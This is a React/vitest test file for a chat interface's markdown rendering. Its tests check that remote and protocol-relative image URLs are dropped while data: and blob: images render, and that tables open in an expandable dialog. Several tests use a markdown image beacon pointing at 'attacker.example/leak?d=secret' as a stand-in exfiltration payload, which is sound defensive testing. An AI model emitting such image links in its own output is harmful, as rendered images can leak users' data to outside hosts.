import {
  measureMarkdownTable,
} from "@curio/ui/components/ai-elements/table";
import {
  MessageResponse,
  SafeMarkdownImage,
} from "@curio/ui/components/ai-elements/message";
import { fireEvent, render, screen, within } from "@testing-library/react";
import { describe, expect, it } from "vitest";

const DATA_IMAGE = "data:image/png;base64,AAAA";
const BLOB_IMAGE = "blob:https://curio.local/1234";
const REMOTE_IMAGE_MARKDOWN =
  "![x](https://attacker.example/leak?d=secret)";

describe("SafeMarkdownImage", () => {
  it("renders data: images", () => {
    render(<SafeMarkdownImage alt="inline" src={DATA_IMAGE} />);

    expect(screen.getByRole("img", { name: "inline" })).toHaveAttribute(
      "src",
      DATA_IMAGE
    );
  });

  it("renders blob: images", () => {
    render(<SafeMarkdownImage alt="preview" src={BLOB_IMAGE} />);

    expect(screen.getByRole("img", { name: "preview" })).toHaveAttribute(
      "src",
      BLOB_IMAGE
    );
  });

  it("drops remote https images", () => {
    const { container } = render(
      <SafeMarkdownImage
        alt="beacon"
        src="https://attacker.example/leak?d=secret"
      />
    );

    expect(container).toBeEmptyDOMElement();
  });

  it("drops relative images", () => {
    const { container } = render(
      <SafeMarkdownImage alt="beacon" src="//attacker.example/leak" />
    );

    expect(container).toBeEmptyDOMElement();
  });

  it("drops a missing src", () => {
    const { container } = render(<SafeMarkdownImage alt="beacon" />);

    expect(container).toBeEmptyDOMElement();
  });

  it("drops a non-string src", () => {
    const { container } = render(
      <SafeMarkdownImage
        alt="beacon"
        src={42 as unknown as string}
      />
    );

    expect(container).toBeEmptyDOMElement();
  });
});

describe("MessageResponse images", () => {
  it("does not emit remote images from model markdown", () => {
    const { container } = render(
      <MessageResponse>{REMOTE_IMAGE_MARKDOWN}</MessageResponse>
    );

    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("attacker.example");
  });
});

const TABLE_MARKDOWN = [
  "| Metric | Value |",
  "| --- | --- |",
  "| Recall@10 | 0.94 |",
  "| p50 latency | 180 ms |",
].join("\n");

describe("MarkdownTable", () => {
  it("counts header columns and body rows", () => {
    const table = document.createElement("table");
    table.innerHTML =
      "<thead><tr><th>a</th><th>b</th><th>c</th></tr></thead>" +
      "<tbody><tr><td>1</td><td>2</td><td>3</td></tr><tr><td>4</td><td>5</td><td>6</td></tr></tbody>";

    expect(measureMarkdownTable(table)).toStrictEqual({
      columns: 3,
      rows: 2,
    });
    expect(measureMarkdownTable(null)).toBeNull();
  });

  it("opens the full table in a window", async () => {
    render(<MessageResponse>{TABLE_MARKDOWN}</MessageResponse>);

    fireEvent.click(screen.getByRole("button", { name: "Expand table" }));

    const tableWindow = await screen.findByRole("dialog", {
      name: "Expanded table",
    });
    expect(
      within(tableWindow).getByText("2 columns · 2 rows")
    ).toBeInTheDocument();
    expect(within(tableWindow).getByRole("table")).toBeInTheDocument();
  });

  it("closes the window with Escape", async () => {
    render(<MessageResponse>{TABLE_MARKDOWN}</MessageResponse>);
    fireEvent.click(screen.getByRole("button", { name: "Expand table" }));
    await screen.findByRole("dialog", { name: "Expanded table" });

    fireEvent.keyDown(document, { key: "Escape" });

    expect(screen.queryByRole("dialog")).toBeNull();
  });

  it("keeps the table in the transcript when the window closes", async () => {
    render(<MessageResponse>{TABLE_MARKDOWN}</MessageResponse>);
    fireEvent.click(screen.getByRole("button", { name: "Expand table" }));
    const tableWindow = await screen.findByRole("dialog", {
      name: "Expanded table",
    });

    fireEvent.click(within(tableWindow).getByRole("button", { name: "Close table" }));

    expect(screen.getByText("Recall@10")).toBeInTheDocument();
  });
});
